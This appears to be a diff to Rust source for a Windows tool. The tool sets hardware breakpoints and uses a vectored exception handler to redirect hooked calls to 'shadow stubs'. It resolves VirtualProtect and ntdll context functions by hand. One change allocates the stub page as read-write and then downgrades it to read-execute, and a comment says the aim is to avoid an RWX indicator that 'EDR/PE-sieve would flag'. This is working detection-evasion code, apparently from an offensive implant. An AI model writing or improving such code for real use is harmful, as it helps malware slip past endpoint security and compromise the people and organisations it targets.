@@ -169,8 +169,9 @@ pub unsafe fn init_shadow_buffer() -> bool {
         u32,
     ) -> *mut core::ffi::c_void;
     let f: VAlloc = core::mem::transmute(addr);
-    // MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40
-    let page = f(core::ptr::null_mut(), 0x1000, 0x3000, 0x40);
+    // MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
+    // Allocate as RW first, write shadow stubs, then downgrade to RX.
+    let page = f(core::ptr::null_mut(), 0x1000, 0x3000, 0x04);
     if page.is_null() {
         return false;
     }
@@ -187,6 +188,21 @@ pub unsafe fn init_shadow_buffer() -> bool {
     buf[11] = 0x07;
     buf[12] = 0x80;
     buf[13] = 0xC3;
+
+    // Downgrade page protection: PAGE_READWRITE → PAGE_EXECUTE_READ (0x20).
+    // Shadow stubs are written once and never modified; RX is sufficient and
+    // closes the RWX IOC that EDR/PE-sieve would flag.
+    type FnVP = unsafe extern "system" fn(
+        *mut core::ffi::c_void, usize, u32, *mut u32,
+    ) -> i32;
+    let vp_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualProtect")
+        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect"));
+    if let Some(vp) = vp_addr {
+        let vp_fn: FnVP = core::mem::transmute(vp);
+        let mut old_protect: u32 = 0;
+        // PAGE_EXECUTE_READ = 0x20
+        let _ = vp_fn(page, 0x1000, 0x20, &mut old_protect);
+    }
     true
 }
 
@@ -214,13 +230,16 @@ unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
 static mut VEH_DIAG_BUF: [u8; 128] = [0u8; 128];
 
 /// Record a byte into VEH_DIAG_BUF as hex for post-crash inspection.
+/// Uses AtomicUsize for POS to avoid data races if VEH handler is re-entered.
 unsafe fn vehtag(ch: u8) {
-    static mut POS: usize = 0;
-    if POS < 126 {
+    use core::sync::atomic::AtomicUsize;
+    static POS: AtomicUsize = AtomicUsize::new(0);
+    let pos = POS.load(core::sync::atomic::Ordering::Relaxed);
+    if pos < 126 {
         let hex = b"0123456789abcdef";
-        VEH_DIAG_BUF[POS] = hex[((ch >> 4) & 0xf) as usize];
-        VEH_DIAG_BUF[POS + 1] = hex[(ch & 0xf) as usize];
-        POS += 2;
+        VEH_DIAG_BUF[pos] = hex[((ch >> 4) & 0xf) as usize];
+        VEH_DIAG_BUF[pos + 1] = hex[(ch & 0xf) as usize];
+        POS.store(pos + 2, core::sync::atomic::Ordering::Relaxed);
     }
 }
 
@@ -231,10 +250,10 @@ pub unsafe fn read_veh_diag() -> [u8; 128] {
 
 #[no_mangle]
 pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
-    vehtag(b'V'); // VEH entered
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'V'); } // VEH entered
 
     if ep == 0 {
-        vehtag(b'0');
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'0'); }
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
@@ -243,7 +262,7 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     let exr = core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8;
     let ctx = core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8;
     if exr.is_null() || ctx.is_null() {
-        vehtag(b'N'); // null pointers
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'N'); } // null pointers
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
@@ -252,7 +271,7 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     if code != STATUS_SINGLE_STEP {
         return EXCEPTION_CONTINUE_SEARCH;
     }
-    vehtag(b'S'); // STATUS_SINGLE_STEP confirmed
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'S'); } // STATUS_SINGLE_STEP confirmed
 
     // Read DR6 — bits 0–3 indicate which slot triggered.
     // DR6 is in the CONTEXT at offset 0x068 (u64).
@@ -264,10 +283,10 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     let slot_bits = dr6 & 0xF;
     if slot_bits == 0 {
         // No B0–B3 set → not a hardware breakpoint trigger, pass through.
-        vehtag(b'b'); // no B bits
+        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'b'); } // no B bits
         return EXCEPTION_CONTINUE_SEARCH;
     }
-    vehtag(b'b' + slot_bits as u8); // which slot(s)
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'b' + slot_bits as u8); } // which slot(s)
 
     // ContextRecord.Rip at x64 CONTEXT offset 0x0F8
     let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;
@@ -285,7 +304,7 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
             let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize);
             if fault_addr == e.target || rip == e.target {
                 // ====== HIT: redirect to shadow stub ======
-                vehtag(b'R'); // redirecting
+                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'R'); } // redirecting
 
                 // Clear DR6 — Windows doesn't auto-clear it, and stale bits
                 // cause misidentification on the next exception.
@@ -312,13 +331,13 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
                     flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
                 );
 
-                vehtag(b'X'); // done
+                if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'X'); } // done
                 return EXCEPTION_CONTINUE_EXECUTION;
             }
         }
     }
 
-    vehtag(b'M'); // no match
+    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) { vehtag(b'M'); } // no match
     EXCEPTION_CONTINUE_SEARCH
 }
 
@@ -442,31 +461,32 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
     let original_dr7 = ctx_read_u64_at(base, CTX_DR7);
     vehtag(b'O'); // original DR7 saved
 
-    // Configure DR0 with the target address.
-    ctx_write_u64_at(base, CTX_DR0, target_addr as u64);
+    // Configure DRx with the target address (slot-specific register).
+    // DR0 is at offset 0x048, DR1 at 0x050, DR2 at 0x058, DR3 at 0x060.
+    ctx_write_u64_at(base, CTX_DR0 + slot * 8, target_addr as u64);
 
     // Clear DR6 (debug status) — stale bits cause misidentification.
     ctx_write_u64_at(base, CTX_DR6, 0);
 
-    // Configure DR7 for an EXECUTE breakpoint on slot 0:
+    // Configure DR7 for an EXECUTE breakpoint on the assigned slot:
     //
-    // DR7 bit layout (relevant bits for slot 0):
-    //   Bit 0:  L0  — Local enable for DR0 (1 = enabled)
-    //   Bit 1:  G0  — Global enable for DR0 (0 — we only need local)
-    //   Bit 16: R/W0 condition bits [1:0] — 00 = Execute
-    //   Bit 18: LEN0 condition bits [1:0] — 00 = 1 byte (instruction)
+    // DR7 bit layout:
+    //   Bits 0,2,4,6: L0,L1,L2,L3 — Local enable for DR0–DR3
+    //   Bits 1,3,5,7: G0,G1,G2,G3 — Global enable for DR0–DR3
+    //   Bits 16-17: R/W0  Bits 18-19: LEN0
+    //   Bits 20-21: R/W1  Bits 22-23: LEN1
+    //   Bits 24-25: R/W2  Bits 26-27: LEN2
+    //   Bits 28-29: R/W3  Bits 30-31: LEN3
     //
-    // So for a local execute breakpoint: DR7 = 0x0000_0001 (just L0)
-    // The condition (execute) and size (1-byte) are encoded in bits 16-19
-    // as 00_00 which is the default (execute, 1 byte).
-    //
-    // Start from the original DR7, clear slot 0's bits, then set L0.
+    // For an execute breakpoint: R/W = 00 (execute), LEN = 00 (1 byte).
+    // Start from the original DR7, clear only this slot's bits, then set L.
     let mut new_dr7 = original_dr7;
-    // Clear slot 0 bits: L0 (bit 0), G0 (bit 1), R/W0 (bits 16-17), LEN0 (bits 18-19)
-    new_dr7 &= !0x0000_0003u64;        // clear L0, G0
-    new_dr7 &= !(0xFu64 << 16);        // clear R/W0 + LEN0
-    // Set L0 (local enable for DR0)
-    new_dr7 |= 1u64;                    // bit 0 = 1
+    // Clear L and G bits for this slot (bits at position slot*2 and slot*2+1)
+    new_dr7 &= !(0x3u64 << (slot * 2));
+    // Clear R/W and LEN bits for this slot (4 bits starting at 16 + slot*4)
+    new_dr7 &= !(0xFu64 << (16 + slot * 4));
+    // Set L bit (local enable) for this slot — R/W and LEN default to 0 (execute, 1-byte)
+    new_dr7 |= 1u64 << (slot * 2);
 
     ctx_write_u64_at(base, CTX_DR7, new_dr7);
     diag(b'i'); // DRs set
@@ -528,14 +548,19 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
             .ok_or("NtGetContextThread unresolved")?,
     );
     if ntgct(NT_CURRENT_THREAD, base) >= 0 {
-        // Clear DR0 and restore original DR7.
-        ctx_write_u64_at(base, CTX_DR0, 0);
+        // Clear the slot-specific DRx register and DR6.
+        ctx_write_u64_at(base, CTX_DR0 + slot * 8, 0);
         ctx_write_u64_at(base, CTX_DR6, 0);
-        if let Some(ref e) = entry {
-            ctx_write_u64_at(base, CTX_DR7, e.original_dr7);
-        } else {
-            ctx_write_u64_at(base, CTX_DR7, 0);
-        }
+
+        // Clear only this slot's bits in DR7 — restoring the full original_dr7
+        // is unsafe when other slots are active (it would clobber their L/RW/LEN bits).
+        let cur_dr7 = ctx_read_u64_at(base, CTX_DR7);
+        let mut dr7 = cur_dr7;
+        // Clear L and G for this slot
+        dr7 &= !(0x3u64 << (slot * 2));
+        // Clear R/W and LEN for this slot
+        dr7 &= !(0xFu64 << (16 + slot * 4));
+        ctx_write_u64_at(base, CTX_DR7, dr7);
         ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
         let ntsct: FnCtx = core::mem::transmute(
             crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")
